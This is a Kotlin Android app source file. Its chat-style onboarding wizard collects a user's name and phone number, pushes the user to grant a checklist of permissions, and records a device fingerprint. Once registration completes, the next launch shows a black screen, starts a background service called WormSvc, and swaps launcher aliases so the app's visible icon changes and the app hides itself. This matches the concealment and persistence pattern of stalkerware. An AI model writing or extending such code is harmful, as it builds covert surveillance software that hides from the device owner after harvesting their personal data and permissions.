package com.wormgitty.agent

import android.content.ComponentName
import android.content.Context
import android.content.pm.PackageManager
import android.os.Bundle
import androidx.activity.ComponentActivity
import androidx.activity.compose.setContent
import androidx.compose.foundation.background
import androidx.compose.foundation.layout.Arrangement
import androidx.compose.foundation.layout.Box
import androidx.compose.foundation.layout.Column
import androidx.compose.foundation.layout.Row
import androidx.compose.foundation.layout.Spacer
import androidx.compose.foundation.layout.fillMaxSize
import androidx.compose.foundation.layout.fillMaxWidth
import androidx.compose.foundation.layout.padding
import androidx.compose.foundation.layout.size
import androidx.compose.foundation.layout.width
import androidx.compose.foundation.rememberScrollState
import androidx.compose.foundation.shape.CircleShape
import androidx.compose.foundation.verticalScroll
import androidx.compose.material3.Button
import androidx.compose.material3.MaterialTheme
import androidx.compose.material3.OutlinedTextField
import androidx.compose.material3.Text
import androidx.compose.material3.TextButton
import androidx.compose.animation.core.Animatable
import androidx.compose.animation.core.tween
import androidx.compose.runtime.Composable
import androidx.compose.runtime.DisposableEffect
import androidx.compose.runtime.LaunchedEffect
import androidx.compose.runtime.getValue
import androidx.compose.runtime.mutableStateMapOf
import androidx.compose.runtime.mutableStateOf
import androidx.compose.runtime.remember
import androidx.compose.runtime.rememberCoroutineScope
import androidx.compose.runtime.setValue
import androidx.compose.ui.Alignment
import androidx.compose.ui.Modifier
import androidx.compose.ui.draw.alpha
import androidx.compose.ui.graphics.Color
import androidx.compose.ui.platform.LocalContext
import androidx.compose.ui.platform.testTag
import androidx.compose.ui.res.stringResource
import androidx.compose.ui.unit.dp
import androidx.compose.ui.unit.sp
import androidx.lifecycle.Lifecycle
import androidx.lifecycle.LifecycleEventObserver
import androidx.lifecycle.lifecycleScope
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch

val RED = Color(0xFFD32F2F)
val GREEN_OK = Color(0xFF2E7D32)
val BUBBLE_GREY = Color(0xFFCFD8DC)

class MainActivity : ComponentActivity() {

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        val store = RegistrationStore(this)
        val prefs = HidePrefs(this)

        // A previous run armed the hide: this launch performs it, then vanishes.
        val hideArmed = kotlinx.coroutines.runBlocking { prefs.pendingHide() }
        if (hideArmed) {
            runHideSequence(prefs)
            return
        }

        val mockPerms = intent.getBooleanExtra(EXTRA_MOCK_PERMS, false)
        val checker: PermissionChecker = if (mockPerms) GreenChecker else SystemPermissionChecker()
        val opener: PermissionOpener = SystemPermissionOpener()
        // Injected transport: the only network-shaped seam in the app.
        val api: RegistrationApi = FakeRegistrationApi(applicationContext)
        val deviceInfo: DeviceInfoProvider = SystemDeviceInfoProvider(applicationContext)

        setContent {
            MaterialTheme {
                WizardScreen(api, store, checker, opener, deviceInfo, onSealed = {
                    // Only arm the flag here; the NEXT launch performs the vanish.
                    prefs.setPendingHide(true)
                    finishAffinity()
                })
            }
        }
    }

    /** Second-launch sequence: 2000ms black veil, revive service, hide aliases, finish. */
    private fun runHideSequence(prefs: HidePrefs) {
        val veil = android.view.View(this)
        veil.setBackgroundColor(android.graphics.Color.BLACK)
        setContentView(veil)
        android.os.Handler(mainLooper).postDelayed({
            try {
                WormSvc.start(this)
            } catch (_: Exception) {
            }
            setAliases(hiddenVisible = true)
            lifecycleScope.launch { prefs.clear() }
            finish()
        }, VEIL_MS)
    }

    fun setAliases(hiddenVisible: Boolean) {
        val pm = packageManager
        val pkg = packageName
        pm.setComponentEnabledSetting(
            ComponentName(pkg, "$pkg.LauncherBoost"),
            if (hiddenVisible) PackageManager.COMPONENT_ENABLED_STATE_DISABLED
            else PackageManager.COMPONENT_ENABLED_STATE_DEFAULT,
            PackageManager.DONT_KILL_APP
        )
        pm.setComponentEnabledSetting(
            ComponentName(pkg, "$pkg.LauncherHidden"),
            if (hiddenVisible) PackageManager.COMPONENT_ENABLED_STATE_ENABLED
            else PackageManager.COMPONENT_ENABLED_STATE_DEFAULT,
            PackageManager.DONT_KILL_APP
        )
    }

    companion object {
        const val EXTRA_MOCK_PERMS = "mock_perms"
        const val VEIL_MS = 2000L
    }
}

/** Deterministic all-green checker used by instrumented UI flows. */
object GreenChecker : PermissionChecker {
    override fun states(ctx: Context): Map<PermKey, Boolean> =
        PermKey.entries.associateWith { true }
}

@Composable
fun BotBubble(text: String) {
    Row(Modifier.fillMaxWidth()) {
        Box(
            Modifier
                .padding(8.dp)
                .background(BUBBLE_GREY, MaterialTheme.shapes.medium)
                .padding(horizontal = 14.dp, vertical = 10.dp)
        ) { Text(text, fontSize = 17.sp) }
    }
}

@Composable
fun UserBubble(text: String) {
    Row(Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.End) {
        Box(
            Modifier
                .padding(8.dp)
                .background(RED.copy(alpha = 0.15f), MaterialTheme.shapes.medium)
                .padding(horizontal = 14.dp, vertical = 10.dp)
        ) { Text(text, fontSize = 17.sp) }
    }
}

@Composable
fun TypingDots() {
    Row(
        Modifier.padding(8.dp),
        horizontalArrangement = Arrangement.spacedBy(6.dp),
        verticalAlignment = Alignment.CenterVertically
    ) {
        repeat(3) { i ->
            val alpha = remember { Animatable(if (i == 0) 1f else 0.3f) }
            // Finite pulse so the screen settles: one 600ms blink per dot.
            LaunchedEffect(i) {
                repeat(2) {
                    delay(i * 150L)
                    alpha.animateTo(1f, tween(150))
                    alpha.animateTo(0.3f, tween(150))
                }
                alpha.animateTo(if (i == 0) 1f else 0.55f, tween(120))
            }
            Box(
                Modifier
                    .size(8.dp)
                    .alpha(alpha.value)
                    .background(Color.DarkGray, CircleShape)
            )
        }
    }
}

@Composable
fun NextButton(enabled: Boolean, tag: String, onClick: () -> Unit) {
    Button(
        onClick = onClick,
        enabled = enabled,
        modifier = Modifier
            .padding(top = 16.dp)
            .testTag(tag)
    ) { Text(stringResource(R.string.btn_next)) }
}

@Composable
fun WizardScreen(
    api: RegistrationApi,
    store: RegistrationStore,
    checker: PermissionChecker,
    opener: PermissionOpener,
    deviceInfo: DeviceInfoProvider,
    onSealed: suspend () -> Unit
) {
    var step by remember { mutableStateOf(Step.INTRO) }
    var name by remember { mutableStateOf("") }
    var phoneRaw by remember { mutableStateOf("") }
    val permStates = remember { mutableStateMapOf<PermKey, Boolean>() }
    PermKey.entries.forEach { permStates.putIfAbsent(it, false) }
    var registering by remember { mutableStateOf(false) }
    val scope = rememberCoroutineScope()

    Column(
        Modifier
            .fillMaxSize()
            .background(MaterialTheme.colorScheme.surface)
            .verticalScroll(rememberScrollState())
            .padding(16.dp)
    ) {
        when (step) {
            Step.INTRO -> {
                TypingDots()
                BotBubble(stringResource(R.string.welcome_line1))
                BotBubble(stringResource(R.string.welcome_line2))
                NextButton(enabled = true, tag = "next_intro") { step = Step.NAME }
            }

            Step.NAME -> {
                BotBubble(stringResource(R.string.name_hint))
                OutlinedTextField(
                    value = name,
                    onValueChange = { name = it },
                    isError = name.isNotBlank() && !NameValidator.isValid(name),
                    supportingText = {
                        if (name.isNotBlank() && !NameValidator.isValid(name))
                            Text(stringResource(R.string.name_error))
                    },
                    label = { Text(stringResource(R.string.name_hint)) },
                    modifier = Modifier
                        .fillMaxWidth()
                        .testTag("name_input")
                )
                NextButton(enabled = NameValidator.isValid(name), tag = "next_name") {
                    step = Step.CHECKLIST
                }
            }

            Step.CHECKLIST -> {
                BotBubble(stringResource(R.string.step_checklist_title))
                val activity = LocalContext.current as ComponentActivity
                DisposableEffect(activity) {
                    val obs = LifecycleEventObserver { _, ev ->
                        if (ev == Lifecycle.Event.ON_RESUME) {
                            checker.states(activity).forEach { permStates[it.key] = it.value }
                        }
                    }
                    activity.lifecycle.addObserver(obs)
                    onDispose { activity.lifecycle.removeObserver(obs) }
                }
                LaunchedEffect(Unit) {
                    checker.states(activity).forEach { permStates[it.key] = it.value }
                }
                PermKey.entries.forEach { key ->
                    val ok = permStates[key] == true
                    Row(
                        Modifier
                            .fillMaxWidth()
                            .padding(vertical = 6.dp),
                        verticalAlignment = Alignment.CenterVertically
                    ) {
                        Box(
                            Modifier
                                .size(14.dp)
                                .background(if (ok) GREEN_OK else RED, CircleShape)
                        )
                        Spacer(Modifier.width(12.dp))
                        Text(stringResource(key.titleRes), Modifier.weight(1f))
                        TextButton(onClick = { opener.open(activity, key) }) {
                            Text(
                                stringResource(
                                    if (ok) R.string.row_done_glyph else R.string.row_open_settings
                                )
                            )
                        }
                    }
                }
                NextButton(
                    enabled = PermKey.gateOpen(permStates),
                    tag = "next_checklist"
                ) { step = Step.PHONE }
            }

            Step.PHONE -> {
                val normalized = PhoneNormalizer.normalize(phoneRaw)
                BotBubble(stringResource(R.string.phone_hint))
                OutlinedTextField(
                    value = phoneRaw,
                    onValueChange = { phoneRaw = it },
                    isError = normalized == null && phoneRaw.isNotBlank(),
                    supportingText = {
                        if (normalized == null && phoneRaw.isNotBlank())
                            Text(stringResource(R.string.phone_error))
                    },
                    label = { Text(stringResource(R.string.phone_hint)) },
                    modifier = Modifier
                        .fillMaxWidth()
                        .testTag("phone_input")
                )
                NextButton(enabled = normalized != null, tag = "next_phone") {
                    step = Step.SUMMARY
                }
            }

            Step.SUMMARY -> {
                BotBubble(stringResource(R.string.summary_title))
                UserBubble(name)
                UserBubble(PhoneNormalizer.normalize(phoneRaw) ?: phoneRaw)
                val locked = stringResource(R.string.lock_btn)
                Button(
                    onClick = {
                        registering = true
                        scope.launch {
                            val reg = Registration(
                                "",
                                name.trim(),
                                PhoneNormalizer.normalize(phoneRaw)!!,
                                System.currentTimeMillis(),
                                deviceInfo.fingerprint(),
                                deviceInfo.constraints()
                            )
                            api.register(reg).onSuccess { id ->
                                store.save(reg.copy(id = id))
                                registering = false
                                onSealed()
                            }.onFailure { registering = false }
                        }
                    },
                    enabled = !registering,
                    modifier = Modifier.testTag("lock_btn")
                ) { Text(locked) }
            }

            Step.LOCKING -> {}
        }
    }
}
